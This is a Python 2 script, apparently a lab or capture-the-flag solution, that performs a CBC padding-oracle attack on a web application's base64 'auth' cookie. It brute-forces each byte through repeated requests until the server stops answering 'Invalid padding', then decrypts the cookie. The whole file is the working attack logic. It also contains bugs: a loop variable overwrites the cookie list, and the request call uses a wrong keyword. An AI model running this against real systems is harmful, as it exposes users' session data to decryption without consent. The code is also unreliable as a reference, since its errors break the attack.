#! /usr/bin/python2

import base64
import requests
import urllib
import sys

url = sys.argv[1]
cookie = sys.argv[2]
length = 8

#convert cookie to hex list
cookie = urllib.unquote_plus(cookie)
cookie = base64.b64decode(cookie)
temp = []
for c in cookie:
    temp.append((hex(ord(c))))
cookie = temp

#split cookie into buckets by length
buckets = []
while len(cookie) > 0:
    buckets.append(cookie[:length])
    cookie = cookie[length:]

whole_message = "?" * length

for b in range(0, len(buckets)-1):
    cookie = list(buckets[b]) + list(buckets[b+1]) #concatenates every 2 following buckets
    part_message = ""
    intermediates = []
    index = length-1
    original_padding = -1 #we will know original padding after first byte decrypted, for now we want just ignore it

    while index >= 0:
        byte = length - index #0x01, 0x02, 0x03...
        i = 1

		#prepare valid padding
        for intermediate in intermediates:
            cookie[index + i] = hex(intermediate ^ byte) #I15 xor E'7 etc.
            i += 1

        current_value = int(cookie[index], 16)

        for value in range(0, 256):
			#we don't want try neither original value nor original padding
            if value != current_value or (index == length - original_padding and byte == original_padding): 

                cookie[index] = hex(value) #try selected value

                #convert for sending
                new_cookie = []
                for cookie in cookie:
                    new_cookie.append(chr(int(cookie, 16)))
                new_cookie = urllib.quote_plus(base64.b64encode("".join(new_cookie)))

                r = requests.get(url, cookie={"auth": new_cookie})

                if "Invalid padding" not in r.text:
                    intermediate = value ^ byte #I15 = VALUE xor 0x01 etc.
                    decrypted = intermediate ^ current_value #C15 = I15 ^ E6
                    intermediates.insert(0, intermediate)
                    part_message = chr(decrypted) + part_message

					#now we know original padding
                    if byte == 1:
                        original_padding = decrypted

                    break

        index -= 1
    whole_message += part_message

print(whole_message)


